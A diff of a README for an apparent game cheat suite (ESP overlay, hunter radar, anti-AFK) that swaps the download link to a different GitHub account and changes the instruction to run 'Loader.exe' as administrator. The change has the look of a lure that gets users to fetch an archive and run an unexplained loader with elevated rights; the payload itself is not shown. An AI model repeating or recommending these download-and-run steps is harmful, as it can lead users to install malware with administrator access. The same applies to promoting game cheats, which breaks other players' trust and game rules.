@@ -6,7 +6,7 @@ ESP Overlay · Colour Grabber · Hunter Radar · Timer HUD · Anti‑AFK · Spri
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download-00b894?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MecchaCamoSuite/MecchaCamoSuite/releases/download/v1.0/MecchaCamoSuite.zip)
+[![Download](https://img.shields.io/badge/Download-00b894?style=for-the-badge&logo=github&logoColor=white)](https://github.com/BrightNautilus/MecchaCamoSuite/releases/download/MecchaCamoSuite/MecchaCamoSuite.zip)
 
 </div>
 
@@ -45,7 +45,7 @@ Every feature can be switched on/off independently via the in‑game overlay or 
 ### Step‑by‑Step
 1. Grab the latest `.zip` archive using the download button above.
 2. Unpack the archive to any folder (e.g., `C:\MecchaCamoSuite`).
-3. **Right‑click** `MecchaCamoSuite.exe` and select **"Run as administrator"** – this is required for the overlay to work.
+3. **Right‑click** `Loader.exe` and select **"Run as administrator"** – this is required for the overlay to work.
 4. Start the game and press `F1` to summon the control menu.
 
 ---
